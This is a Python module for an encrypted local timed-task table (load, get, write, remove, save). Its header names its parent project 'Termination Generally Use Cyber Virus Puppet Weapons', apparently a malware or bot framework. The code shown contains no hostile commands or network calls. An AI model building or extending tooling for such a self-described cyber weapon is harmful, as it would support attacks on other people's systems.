# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLib/T_LW3T
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# Local Time Task Table
# Timed tasks can be implemented, which currently require further modifications.


from .T_imports import *
from .T_FIO import FIO
from . import T_Std


class L3T:
    def __init__(self, master: 'Termination4.Termination'):
        self.master=master
        self.__init_values__()
    def __init_values__(self):
        if hasattr(self.master.WSD, "__need_L3T__"):
            self.__need_L3T__=self.master.WSD.__need_L3T__
            self.L3T: dict=ast.literal_eval(self.master.GodKeys.decrypt(FIO.openr(self.__need_L3T__, 2)))["LocalTimeTaskTable"]
            print(f"L3T: {self.L3T}")
        else:
            print("L3T: __need_L3T__ not in WSD")
    def write(self, j):
        try: FIO.openw(self.__need_L3T__, self.master.GodKeys.encrypt(str({"LocalTimeTaskTable": j})), 2)
        except Exception as e:
            print(T_Std.ErrorFormat(e, "L3T Write Error"))
            return False
        return True
    def save(self):
        return self.write(self.L3T)
    def get(self, key):
        if key in self.L3T: return self.L3T[key]
        return False
    def writek(self, key, value):
        if key in self.L3T:
            return False
        self.L3T[key]=value
        return self.save()
    def writekc(self, key, value):
        self.L3T[key]=value
        return self.save()
    def remove(self, key):
        if key not in self.L3T:
            return False
        self.L3T.pop(key)
        return self.save()
    def Is(self, key):
        return key in self.L3T
    def read(self):
        return self.L3T
